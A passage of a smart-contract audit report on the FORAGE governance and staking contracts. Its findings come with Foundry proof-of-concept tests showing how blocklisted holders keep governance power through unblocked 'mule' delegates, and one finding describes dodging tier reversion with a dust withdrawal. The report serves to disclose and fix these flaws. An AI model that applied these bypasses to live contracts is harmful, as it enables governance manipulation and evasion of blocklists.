function _beforeCall(bytes32 id, bytes32 predecessor) internal view override {
    super._beforeCall(id, predecessor);
    _rejectUnsafeGovernorManagedSelfCalls(id);
}
```

If open execution must remain, then the timelock itself—not the governor—must reject `updateDelay()` below the enforced floor for governor-managed instances.

#### Assumptions

- [x] The proposal can reach `Succeeded` and be queued normally.
- [x] The deployment follows the open-executor topology where `EXECUTOR_ROLE` includes `address(0)`.
- [x] The bypass does not depend on `ForageGovernor.execute()`; the direct timelock path is sufficient.

#### Predicted Invalid Reasons

- “A successful proposal still has to pass voting and quorum. If governance wants to lower the delay, that is just authorized governance behavior, not a security bug.”

<a id="finding-open-84"></a>
### OPEN-84 — Partnership vesting wallets never wire a blocklist, allowing blocked beneficiaries to recover unvested governance power through unblocked mules

#### Summary

`FORAGETreasury.distributePartnership()` creates partnership `DelegatingVestingWallet`s without wiring a blocklist, so `_blocklist` stays `address(0)`. If a beneficiary is later blocked, they can still call `delegateVotingPower()` and re-route the wallet’s unvested voting power to an unblocked mule, which can then satisfy `ForageGovernor` proposal and vote checks.

#### Context Files

##### FORAGETreasury.distributePartnership

Path: `openforage_audit_repo/openforage_smart_contracts/src/FORAGETreasury.sol`
Highlight lines: 141, 154, 158

```solidity
function distributePartnership(
    address beneficiary,
    address delegatee,
    uint256 amount,
    uint64 start,
    uint64 duration,
    uint64 cliff
) external onlyOwner nonReentrant returns (address wallet) {
    ...
    wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
    DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
    _forageToken.safeTransfer(wallet, amount);
    DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
    DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
    totalPartnershipDistributed += amount;
}
```

##### DelegatingVestingWallet.delegateVotingPower

Path: `openforage_audit_repo/openforage_smart_contracts/src/DelegatingVestingWallet.sol`
Highlight lines: 167, 172, 175, 178

```solidity
function delegateVotingPower(address newDelegatee) external {
    if (msg.sender != _beneficiary) revert UnauthorizedBeneficiary(msg.sender);
    if (_forageToken == address(0)) revert ForageTokenNotSet();
    if (newDelegatee == address(0)) revert ZeroAddress();
    _requireNotBlocked(_beneficiary);
    _requireNotBlocked(address(this));
    _requireNotBlocked(newDelegatee);
    ...
    _callDelegate(newDelegatee);
}
```

##### DelegatingVestingWallet._requireNotBlocked

Path: `openforage_audit_repo/openforage_smart_contracts/src/DelegatingVestingWallet.sol`
Highlight lines: 278, 279, 280, 281, 282

```solidity
function _requireNotBlocked(address account) private view {
    address blocklist_ = _blocklist;
    if (blocklist_ != address(0) && IBlocklist(blocklist_).isBlocked(account)) {
        revert BlockedAddress(account);
    }
}
```

##### ForageToken.delegate

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageToken.sol`
Highlight lines: 118, 119, 120, 123, 124, 125

```solidity
function delegate(address delegatee) public override {
    address account = _msgSender();
    _requireNotBlocked(account);
    if (delegatee != address(0)) {
        _requireNotBlocked(delegatee);
    }
    super.delegate(delegatee);
}
```

##### ForageGovernor.propose

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageGovernor.sol`
Highlight lines: 204, 205, 209, 215, 225

```solidity
address proposerAddr = _msgSender();
_requireNotBlocked(proposerAddr);
...
uint256 proposerVotes = getVotes(proposerAddr, clock() - 1);
```

##### ForageGovernor._castVote

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageGovernor.sol`
Highlight lines: 622, 623, 626, 627, 632

```solidity
function _castVote(uint256 proposalId, address account, uint8 support, string memory reason, bytes memory params)
    internal
    override(GovernorUpgradeable)
    returns (uint256)
{
    _requireNotBlocked(account);
    uint256 weight = super._castVote(proposalId, account, support, reason, params);
    ...
}
```

#### Proof of Concept

Run `timeout 300 forge test --match-path test/POC_FORAGETreasury_PartnershipWalletBlocklist_608c0eed.t.sol -vv` in `openforage_smart_contracts`. The PoC deploys real `Blocklist`, `ForageToken`, `FORAGETreasury`, and `ForageGovernor` instances, creates a partnership wallet, shows `wallet.blocklist() == address(0)` and that `wallet.setBlocklist()` is not callable from the owner, then blocklists the beneficiary and proves the beneficiary can still call `delegateVotingPower(mule)` to let an unblocked mule cross `proposalThreshold()` and create a proposal.

##### POC_FORAGETreasury_PartnershipWalletBlocklist_608c0eed.t.sol

Path: `openforage_smart_contracts/test/POC_FORAGETreasury_PartnershipWalletBlocklist_608c0eed.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

import "../src/Blocklist.sol";
import "../src/DelegatingVestingWallet.sol";
import "../src/FORAGETreasury.sol";
import "../src/ForageGovernor.sol";
import "../src/ForageToken.sol";

/**
 * @title POC: Partnership wallet blocklist is never wired
 * @notice Proof Statement: Proves that a partnership wallet created through `FORAGETreasury.distributePartnership`
 * is left with `blocklist() == address(0)`, cannot be blocklist-wired through the exposed interfaces after creation,
 * and still lets a later-blocked beneficiary re-delegate the wallet's votes to an unblocked mule who can cross
 * `ForageGovernor`'s proposal threshold and successfully create a proposal.
 */
contract POC_FORAGETreasury_PartnershipWalletBlocklist_608c0eed is Test {
    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal teamVesting = makeAddr("teamVesting");
    address internal treasuryHolder = makeAddr("treasuryHolder");
    address internal beneficiary = makeAddr("beneficiary");
    address internal mule = makeAddr("mule");

    Blocklist internal blocklist;
    ForageToken internal forage;
    FORAGETreasury internal treasury;
    ForageGovernor internal governor;

    uint256 internal constant PARTNER_GRANT = 1_500_000e18;
    uint48 internal constant VOTING_DELAY = 0;
    uint32 internal constant VOTING_PERIOD = 1 hours;
    uint256 internal constant THRESHOLD_BPS = 100;
    uint256 internal constant QUORUM_BPS = 400;

    function setUp() public {
        vm.warp(100);
        _deployBlocklist();
        _deployToken();
        _deployTreasury();
        _deployGovernor();

        vm.prank(owner);
        forage.setBlocklist(address(blocklist));

        vm.prank(owner);
        treasury.setBlocklist(address(blocklist));

        vm.prank(treasuryHolder);
        forage.transfer(address(treasury), PARTNER_GRANT);
    }

    function test_blockedBeneficiaryCanRestoreProposalPowerThroughMule() public {
        vm.prank(owner);
        address walletAddr = treasury.distributePartnership(
            beneficiary,
            beneficiary,
            PARTNER_GRANT,
            uint64(block.timestamp + 1 days),
            uint64(4 * 365 days),
            uint64(365 days)
        );

        DelegatingVestingWallet wallet = DelegatingVestingWallet(walletAddr);

        assertEq(wallet.blocklist(), address(0), "partnership wallet never stores a blocklist");
        assertEq(forage.delegates(walletAddr), beneficiary, "wallet starts delegated to the beneficiary");

        vm.prank(owner);
        vm.expectRevert(
            abi.encodeWithSelector(DelegatingVestingWallet.UnauthorizedTokenSetter.selector, owner)
        );
        wallet.setBlocklist(address(blocklist));

        _advanceClock();

        vm.prank(guardian);
        blocklist.blockAddress(beneficiary);

        vm.prank(beneficiary);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, beneficiary));
        governor.propose(_targets(), _values(), _calldatas(), "blocked beneficiary proposal");

        vm.prank(beneficiary);
        wallet.delegateVotingPower(mule);
        assertEq(forage.delegates(walletAddr), mule, "blocked beneficiary can still retarget votes");

        _advanceClock();

        uint256 threshold = governor.proposalThreshold();
        uint256 muleVotes = governor.getVotes(mule, governor.clock() - 1);
        assertGe(muleVotes, threshold, "mule recovers enough voting power to propose");

        vm.prank(mule);
        uint256 proposalId = governor.propose(_targets(), _values(), _calldatas(), "mule proposal");

        assertTrue(proposalId != 0, "mule can create a governance proposal with redirected votes");
    }

    function _deployBlocklist() internal {
        Blocklist implementation = new Blocklist();
        bytes memory initData = abi.encodeCall(Blocklist.initialize, (guardian, owner));
        blocklist = Blocklist(address(new ERC1967Proxy(address(implementation), initData)));
    }

    function _deployToken() internal {
        ForageToken implementation = new ForageToken();
        bytes memory initData = abi.encodeCall(ForageToken.initialize, (teamVesting, treasuryHolder, owner));
        forage = ForageToken(address(new ERC1967Proxy(address(implementation), initData)));
    }

    function _deployTreasury() internal {
        FORAGETreasury implementation = new FORAGETreasury();
        bytes memory initData = abi.encodeCall(FORAGETreasury.initialize, (address(forage), owner));
        treasury = FORAGETreasury(address(new ERC1967Proxy(address(implementation), initData)));
    }

    function _deployGovernor() internal {
        address[] memory proposers = new address[](1);
        proposers[0] = owner;

        address[] memory executors = new address[](1);
        executors[0] = address(0);

        TimelockController timelock = new TimelockController(0, proposers, executors, address(0));
        ForageGovernor implementation = new ForageGovernor();
        bytes memory initData = abi.encodeCall(
            ForageGovernor.initialize,
            (address(forage), address(timelock), VOTING_DELAY, VOTING_PERIOD, THRESHOLD_BPS, QUORUM_BPS, address(0))
        );
        governor = ForageGovernor(payable(address(new ERC1967Proxy(address(implementation), initData))));
    }

    function _advanceClock() internal {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
    }

    function _targets() internal view returns (address[] memory targets) {
        targets = new address[](1);
        targets[0] = address(forage);
    }

    function _values() internal pure returns (uint256[] memory values) {
        values = new uint256[](1);
    }

    function _calldatas() internal pure returns (bytes[] memory calldatas) {
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("totalSupply()");
    }
}

```

#### Recommendation

The treasury should wire the blocklist immediately for every newly created partnership wallet before it becomes usable for governance actions.

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setBlocklist(blocklist);
```

If the team wants belt-and-suspenders protection, `DelegatingVestingWallet` can also refuse `delegateVotingPower()` and `release()` while `_blocklist == address(0)`.

#### Assumptions

- [x] At least one partnership wallet is created through `FORAGETreasury.distributePartnership()`.
- [x] The treasury does not already perform a same-transaction `setBlocklist()` on the returned wallet.
- [x] The beneficiary is later blocklisted while the chosen delegatee or mule remains unblocked.
- [x] The partnership grant is large enough to matter for proposal threshold or voting power.

#### Predicted Invalid Reasons

- “This is only a compliance/setup issue. The blocked beneficiary still cannot claim or vote directly, and the team can always block the wallet too if needed.”

<a id="finding-open-94"></a>
### OPEN-94 — Partnership vesting wallets are permanently blocklist-less, letting blocked beneficiaries reroute unvested FORAGE votes to unblocked governance delegates

#### Summary

`FORAGETreasury.distributePartnership` creates partnership `DelegatingVestingWallet`s without calling `setBlocklist`, and the treasury currently exposes no path to wire one later. Because the wallet-local checks in `delegateVotingPower` stay inert when `_blocklist == address(0)`, a later-blocklisted beneficiary can still re-delegate the wallet’s unvested FORAGE to any unblocked address, which can then propose or vote in `ForageGovernor`.

#### Context Files

##### FORAGETreasury.distributePartnership

Path: `openforage_audit_repo/openforage_smart_contracts/src/FORAGETreasury.sol`
Highlight lines: 141

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
```

##### DelegatingVestingWallet authorization gate

Path: `openforage_audit_repo/openforage_smart_contracts/src/DelegatingVestingWallet.sol`
Highlight lines: 82

```solidity
if (msg.sender != _tokenSetter && msg.sender != _blocklistSetter) {
    revert UnauthorizedTokenSetter(msg.sender);
}
```

##### DelegatingVestingWallet token-setter burn

Path: `openforage_audit_repo/openforage_smart_contracts/src/DelegatingVestingWallet.sol`
Highlight lines: 139

```solidity
_tokenSetter = address(0);
```

##### ForageToken delegation blocklist check

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageToken.sol`
Highlight lines: 118

```solidity
address account = _msgSender();
_requireNotBlocked(account);
if (delegatee != address(0)) {
    _requireNotBlocked(delegatee);
}
super.delegate(delegatee);
```

##### ForageGovernor proposal screening

Path: `openforage_audit_repo/openforage_smart_contracts/src/ForageGovernor.sol`
Highlight lines: 190

```solidity
_requireNotBlocked(proposerAddr);
uint256 proposerVotes = getVotes(proposerAddr, clock() - 1);
```

#### Proof of Concept

Run `forge test --match-path test/POC_FORAGETreasuryPartnershipBlocklistBypass_f500813a.t.sol -vv`. The PoC deploys real `Blocklist`, `ForageToken`, `FORAGETreasury`, and `ForageGovernor` instances, funds a 1,000,000 FORAGE partnership grant, creates a partnership vesting wallet, blocklists the beneficiary, proves `delegateVotingPower(accomplice)` still succeeds because `wallet.blocklist()` is unset, and then shows the accomplice can call `governor.propose(...)` with the rerouted votes.

##### POC_FORAGETreasuryPartnershipBlocklistBypass_f500813a.t.sol

Path: `test/POC_FORAGETreasuryPartnershipBlocklistBypass_f500813a.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

import "../src/Blocklist.sol";
import "../src/DelegatingVestingWallet.sol";
import "../src/FORAGETreasury.sol";
import "../src/ForageGovernor.sol";
import "../src/ForageToken.sol";

/**
 * @title POC: Partnership Wallets Miss Blocklist Wiring And Can Re-route Votes
 * @notice Proof Statement: Prove that a partnership vesting wallet created by `FORAGETreasury.distributePartnership`
 * never receives a wallet-local blocklist, so once the beneficiary is later blocklisted they can still call
 * `delegateVotingPower` on the wallet and move its unvested FORAGE votes to an unblocked accomplice; after the
 * delegation checkpoint matures, the accomplice can successfully create a governance proposal with the rerouted votes.
 */
contract POC_FORAGETreasuryPartnershipBlocklistBypass_f500813a is Test {
    uint256 private constant PARTNERSHIP_GRANT = 1_000_000e18;
    uint48 private constant VOTING_DELAY = 0;
    uint32 private constant VOTING_PERIOD = 1 hours;
    uint256 private constant PROPOSAL_THRESHOLD_BPS = 100;
    uint256 private constant QUORUM_BPS = 400;

    address private owner;
    address private guardian;
    address private teamVesting;
    address private partner;
    address private accomplice;

    Blocklist private blocklist;
    ForageToken private forage;
    FORAGETreasury private treasury;
    ForageGovernor private governor;
    TimelockController private timelock;

    function setUp() public {
        vm.warp(100);

        owner = makeAddr("timelock");
        guardian = makeAddr("guardian");
        teamVesting = makeAddr("teamVesting");
        partner = makeAddr("partner");
        accomplice = makeAddr("accomplice");

        Blocklist blocklistImplementation = new Blocklist();
        bytes memory blocklistInit = abi.encodeCall(Blocklist.initialize, (guardian, owner));
        blocklist = Blocklist(address(new ERC1967Proxy(address(blocklistImplementation), blocklistInit)));

        ForageToken forageImplementation = new ForageToken();
        bytes memory forageInit = abi.encodeCall(ForageToken.initialize, (teamVesting, owner, owner));
        forage = ForageToken(address(new ERC1967Proxy(address(forageImplementation), forageInit)));

        FORAGETreasury treasuryImplementation = new FORAGETreasury();
        bytes memory treasuryInit = abi.encodeCall(FORAGETreasury.initialize, (address(forage), owner));
        treasury = FORAGETreasury(address(new ERC1967Proxy(address(treasuryImplementation), treasuryInit)));

        vm.startPrank(owner);
        forage.transfer(address(treasury), PARTNERSHIP_GRANT);
        forage.setBlocklist(address(blocklist));
        treasury.setBlocklist(address(blocklist));
        vm.stopPrank();

        address[] memory proposers = new address[](0);
        address[] memory executors = new address[](0);
        timelock = new TimelockController(0, proposers, executors, owner);

        ForageGovernor governorImplementation = new ForageGovernor();
        bytes memory governorInit = abi.encodeCall(
            ForageGovernor.initialize,
            (
                address(forage),
                address(timelock),
                VOTING_DELAY,
                VOTING_PERIOD,
                PROPOSAL_THRESHOLD_BPS,
                QUORUM_BPS,
                address(0)
            )
        );
        governor = ForageGovernor(payable(address(new ERC1967Proxy(address(governorImplementation), governorInit))));
    }

    function test_blockedBeneficiaryCanReRouteVotesAndRegainProposalPower() public {
        vm.prank(owner);
        address walletAddress = treasury.distributePartnership(
            partner,
            partner,
            PARTNERSHIP_GRANT,
            uint64(block.timestamp + 1 days),
            uint64(4 * 365 days),
            uint64(365 days)
        );

        DelegatingVestingWallet wallet = DelegatingVestingWallet(walletAddress);
        assertEq(wallet.blocklist(), address(0), "partnership wallet blocklist stays unset");
        assertEq(wallet.tokenSetter(), address(0), "token setter burns after token wiring");
        assertEq(forage.delegates(walletAddress), partner, "wallet initially delegates to the beneficiary");
        emit log_named_address("wallet", walletAddress);
        emit log_named_address("walletBlocklist", wallet.blocklist());

        vm.prank(guardian);
        blocklist.blockAddress(partner);
        assertTrue(blocklist.isBlocked(partner), "beneficiary must be blocklisted");

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _proposalPayload();

        vm.prank(partner);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, partner));
        governor.propose(targets, values, calldatas, "blocked beneficiary cannot propose directly");

        vm.prank(partner);
        wallet.delegateVotingPower(accomplice);
        assertEq(forage.delegates(walletAddress), accomplice, "blocked beneficiary can still re-delegate wallet votes");

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        assertEq(forage.getVotes(accomplice), PARTNERSHIP_GRANT, "accomplice receives full unvested voting power");
        assertEq(governor.proposalThreshold(), PARTNERSHIP_GRANT, "grant alone reaches proposal threshold");
        emit log_named_uint("accompliceVotes", forage.getVotes(accomplice));
        emit log_named_uint("proposalThreshold", governor.proposalThreshold());

        vm.prank(accomplice);
        uint256 proposalId = governor.propose(targets, values, calldatas, "accomplice regains proposal power");

        assertTrue(proposalId != 0, "accomplice proposal should succeed");
        assertEq(governor.proposalProposer(proposalId), accomplice, "proposal must be attributed to the accomplice");
        emit log_named_uint("proposalId", proposalId);
    }

    function _proposalPayload()
        private
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](1);
        targets[0] = address(treasury);

        values = new uint256[](1);

        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(FORAGETreasury.forageToken, ());
    }
}
```

#### Recommendation

The treasury should wire the wallet blocklist as part of `distributePartnership`, before relinquishing setter authority, and it should expose a governance-controlled passthrough for future `replaceBrokenBlocklist` recovery.

A minimal fix is to set the wallet blocklist immediately after deployment:

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setBlocklist(blocklist);
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
```

Additionally, add a treasury-only helper such as `setPartnershipWalletBlocklist(address wallet, address blocklist_)` / `replacePartnershipWalletBlocklist(...)` so governance can repair already-deployed wallets and future blocklist breakages.

Fix checklist:

- [ ] Call `DelegatingVestingWallet(wallet).setBlocklist(blocklist)` during `distributePartnership` before `setForageToken`.
- [ ] Add a treasury passthrough that forwards `setBlocklist(...)` to an existing partnership wallet.
- [ ] Add a treasury passthrough that forwards `replaceBrokenBlocklist(...)` to an existing partnership wallet.

#### Assumptions

- [x] The blocked beneficiary received a meaningful partnership vesting grant.
- [x] The guardian blocklists the beneficiary address, not every derived vesting-wallet contract address.
- [x] The replacement delegate is not itself blocklisted.

#### Predicted Invalid Reasons

- "A blocked beneficiary still cannot vote directly, and guardians can always block the wallet address too."

<a id="finding-open-98"></a>
### OPEN-98 — Blocked balances remain fully votable through pre-blocklist delegates

#### Summary

`ForageToken.delegate()` only checks the blocklist at delegation time, and `ForageGovernor.propose()` / `_castVote()` only block the direct caller. If a holder delegates to an unblocked mule before being blocklisted, the mule keeps that holder’s checkpointed voting weight for proposal threshold checks and votes, while the blocked holder cannot re-delegate, transfer, or be burned to unwind it.

#### Context Files

##### ForageToken.delegate

Path: `src/ForageToken.sol`
Highlight lines: 2

```solidity
function delegate(address delegatee) public override {
    address account = _msgSender();
    _requireNotBlocked(account);
    if (delegatee != address(0)) {
        _requireNotBlocked(delegatee);
    }
    super.delegate(delegatee);
}
```

##### ForageGovernor.propose

Path: `src/ForageGovernor.sol`
Highlight lines: 2

```solidity
address proposerAddr = _msgSender();
_requireNotBlocked(proposerAddr);
uint256 proposerVotes = getVotes(proposerAddr, clock() - 1);
```

##### ForageGovernor._castVote

Path: `src/ForageGovernor.sol`
Highlight lines: 2

```solidity
function _castVote(...) internal override returns (uint256) {
    _requireNotBlocked(account);
    uint256 weight = super._castVote(...);
}
```

##### ForageToken._update

Path: `src/ForageToken.sol`
Highlight lines: 2

```solidity
if (from != address(0)) {
    _requireNotBlocked(from);
}
```

##### ForageToken.burn

Path: `src/ForageToken.sol`
Highlight lines: 3

```solidity
function burn(address from, uint256 amount) external {
    ...
    _requireNotBlocked(from);
}
```

#### Proof of Concept

Run `timeout 300 forge test --match-path test/POC_ForageGovernor_BlockedDelegation_ed25fb04.t.sol -vv`. The PoC deploys the real `ForageToken`, `Blocklist`, `ForageGovernor`, and `TimelockController`, transfers `5,000,000 FORAGE` to `whale`, delegates to `mule`, blocklists `whale`, and then shows that `mule` still proposes and votes with the blocked balance while `whale` cannot re-delegate or be burned. The proposal reaches `Succeeded`.

##### POC_ForageGovernor_BlockedDelegation_ed25fb04.t.sol

Path: `test/POC_ForageGovernor_BlockedDelegation_ed25fb04.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/IGovernor.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";
import "../src/ForageToken.sol";
import "../src/ForageGovernor.sol";
import "../src/Blocklist.sol";

/**
 * @title POC: Blocked balances stay votable through pre-blocklist delegates
 * @notice Proof Statement: Proves that a FORAGE holder can delegate to an unblocked mule before
 * blocklisting, then remain fully represented in governance after blocklisting: the mule still
 * clears the 1% proposal threshold and casts enough votes to satisfy the 4% quorum, while the
 * blocked holder cannot unwind the delegation onchain.
 */
contract POC_ForageGovernor_BlockedDelegation_ed25fb04 is Test {
    uint48 internal constant VOTING_DELAY = 0;
    uint32 internal constant VOTING_PERIOD = 3_600;
    uint256 internal constant THRESHOLD_BPS = 100;
    uint256 internal constant QUORUM_BPS = 400;
    uint256 internal constant WHALE_BALANCE = 5_000_000e18;

    ForageToken internal token;
    ForageGovernor internal governor;
    Blocklist internal blocklist;
    TimelockController internal timelock;

    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal teamVesting = makeAddr("teamVesting");
    address internal forageTreasury = makeAddr("forageTreasury");
    address internal whale = makeAddr("whale");
    address internal mule = makeAddr("mule");
    address internal burner = makeAddr("burner");

    function setUp() public {
        vm.warp(100);

        ForageToken tokenImpl = new ForageToken();
        token = ForageToken(
            address(
                new ERC1967Proxy(
                    address(tokenImpl),
                    abi.encodeCall(ForageToken.initialize, (teamVesting, forageTreasury, owner))
                )
            )
        );

        Blocklist blocklistImpl = new Blocklist();
        blocklist = Blocklist(
            address(
                new ERC1967Proxy(
                    address(blocklistImpl),
                    abi.encodeCall(Blocklist.initialize, (guardian, owner))
                )
            )
        );

        vm.prank(owner);
        token.setBlocklist(address(blocklist));

        vm.prank(owner);
        token.setAuthorizedBurner(burner, true);

        address[] memory proposers = new address[](1);
        proposers[0] = owner;
        address[] memory executors = new address[](1);
        executors[0] = address(0);
        timelock = new TimelockController(0, proposers, executors, address(0));

        ForageGovernor governorImpl = new ForageGovernor();
        governor = ForageGovernor(
            payable(
                address(
                    new ERC1967Proxy(
                        address(governorImpl),
                        abi.encodeCall(
                            ForageGovernor.initialize,
                            (
                                address(token),
                                address(timelock),
                                VOTING_DELAY,
                                VOTING_PERIOD,
                                THRESHOLD_BPS,
                                QUORUM_BPS,
                                address(0)
                            )
                        )
                    )
                )
            )
        );

        vm.prank(forageTreasury);
        token.transfer(whale, WHALE_BALANCE);

        vm.prank(whale);
        token.delegate(mule);

        vm.warp(block.timestamp + 1);

        vm.prank(guardian);
        blocklist.blockAddress(whale);

        vm.warp(block.timestamp + 1);
    }

    function test_POC_blockedBalanceRemainsFullyUsableByUnblockedDelegate() public {
        assertTrue(blocklist.isBlocked(whale), "whale must be blocked");
        assertFalse(blocklist.isBlocked(mule), "mule must remain unblocked");
        assertEq(token.delegates(whale), mule, "delegation should persist");
        assertEq(token.getVotes(mule), WHALE_BALANCE, "delegate retains blocked whale votes");
        assertEq(governor.proposalThreshold(), 1_000_000e18, "threshold should remain 1%");
        assertEq(governor.getVotes(mule, governor.clock() - 1), WHALE_BALANCE, "governor still credits blocked balance");

        address[] memory targets = new address[](1);
        targets[0] = address(governor);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(ForageGovernor.setMaxActiveProposals, (10));

        vm.prank(whale);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, whale));
        governor.propose(targets, values, calldatas, "blocked-whale-direct");

        vm.prank(whale);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, whale));
        token.delegate(whale);

        vm.prank(burner);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, whale));
        token.burn(whale, 1e18);

        vm.prank(mule);
        uint256 proposalId = governor.propose(targets, values, calldatas, "mule-uses-blocked-weight");

        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Pending), "proposal starts pending");

        vm.warp(block.timestamp + 1);
        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Active), "proposal becomes active");

        vm.prank(mule);
        uint256 countedWeight = governor.castVote(proposalId, 1);
        assertEq(countedWeight, WHALE_BALANCE, "mule votes with blocked whale balance");

        vm.warp(block.timestamp + VOTING_PERIOD + 1);

        (uint256 againstVotes, uint256 forVotes, uint256 abstainVotes) = governor.proposalVotes(proposalId);
        assertEq(againstVotes, 0, "no against votes expected");
        assertEq(forVotes, WHALE_BALANCE, "blocked whale balance counts toward for votes");
        assertEq(abstainVotes, 0, "no abstain votes expected");
        assertEq(governor.quorumForProposal(proposalId), 4_000_000e18, "quorum should remain 4%");
        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Succeeded), "proposal succeeds");
    }
}
```

#### Recommendation

Make governance weight blocklist-aware at the source instead of only at the transaction edge. The safest fix is to override `_getVotingUnits()` in `ForageToken` (or otherwise hook blocklist changes) so blocked balances stop contributing voting units, and to force vote migration away from blocked delegates when an account is blocked. At minimum, the governor should reject votes and proposal-threshold credit that depend on blocked source balances.

#### Assumptions

- [x] Blocklisting is intended to remove governance influence, not only prevent direct transaction submission.
- [x] A holder can delegate before becoming blocked.
- [x] An unblocked delegate controlled by, or colluding with, the blocked holder is realistic.
- [x] No offchain process forcibly clears delegations on blocklist events.
- [x] `ForageToken` remains the governor’s vote source during the block period.

#### Predicted Invalid Reasons

- “The blocked account itself cannot call `propose()` or `castVote()`, so governance is already protected.”

<a id="finding-open-99"></a>
### OPEN-99 — Expired opt-out tier holders can evade Tier-0 reversion indefinitely by rolling a dust pending withdrawal

#### Summary

Expired opt-out Tier 1/2/3 holders can keep most of their position live in the higher tier by opening a dust `requestWithdrawal()` after maturity. Because `processExpiredLockups()` and `selfRevert()` short-circuit on any `hasPendingWithdrawal`, the account is not reverted to Tier 0 and the residual shares keep earning future tier yield.

#### Context Files

##### requestWithdrawal

Path: `openforage_smart_contracts/src/atRISKUSD.sol`
Highlight lines: 1

```solidity
function requestWithdrawal(uint256 atriskusdAmount) external whenNotPaused nonReentrant {
    if (_lockupPeriod > 0 && block.timestamp < _lockExpiry[msg.sender]) {
        revert LockupNotExpired(_lockExpiry[msg.sender]);
    }
    if (_pendingWithdrawals[msg.sender].active) revert PendingWithdrawalExists();
    uint256 riskusdAmount = convertToAssets(atriskusdAmount);
    _pendingWithdrawals[msg.sender] = PendingWithdrawal({ ... active: true, ... });
    _transfer(msg.sender, address(this), atriskusdAmount);
}
```

##### processExpiredLockups

Path: `openforage_smart_contracts/src/StakingQueue.sol`
Highlight lines: 1

```solidity
(bool hasLockup, bool isExpired, bool autoRenew, bool hasPendingWithdrawal, uint256 shares) =
    _getLockupInfo(tierVaultAddr, depositor);

if (!hasLockup || !isExpired || hasPendingWithdrawal) return;
```

##### selfRevert

Path: `openforage_smart_contracts/src/StakingQueue.sol`
Highlight lines: 1

```solidity
(bool hasLockup, bool isExpired, bool autoRenew, bool hasPendingWithdrawal, uint256 shares) =
    _getLockupInfo(tierVaultAddr, msg.sender);
if (!hasLockup || !isExpired || hasPendingWithdrawal || autoRenew) revert InvalidQueueEntry();
```

##### maturityRule

Path: `documentation/smart_contract/target_smart_contract_architecture.html`
Highlight lines: 1

```markdown
... a depositor who turns auto-renew off has their position reverted to Tier 0 (the no-lock tier) at maturity instead.
```

#### Proof of Concept

Save the PoC as `test/POC_atRISKUSD.transferLock_02eabff9.t.sol`, run `forge test --match-path test/POC_atRISKUSD.transferLock_02eabff9.t.sol --match-test test_POC_expiredOptOutDustPendingWithdrawalKeepsTierYield -vv`, and observe:
- the control user reverts from Tier 1 to Tier 0 when `processExpiredLockups()` runs;
- the attacker, with only a dust pending withdrawal, is skipped and keeps the residual Tier-1 balance;
- `selfRevert()` rejects the attacker while the pending flag is active;
- `accrueYield()` increases the residual Tier-1 shares’ asset value;
- after cooldown, the attacker can cancel and reopen the dust request, and the next expiry pass still skips the account.

##### POC_ExpiredOptOutDustPendingWithdrawal_02eabff9

Path: `test/POC_atRISKUSD.transferLock_02eabff9.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
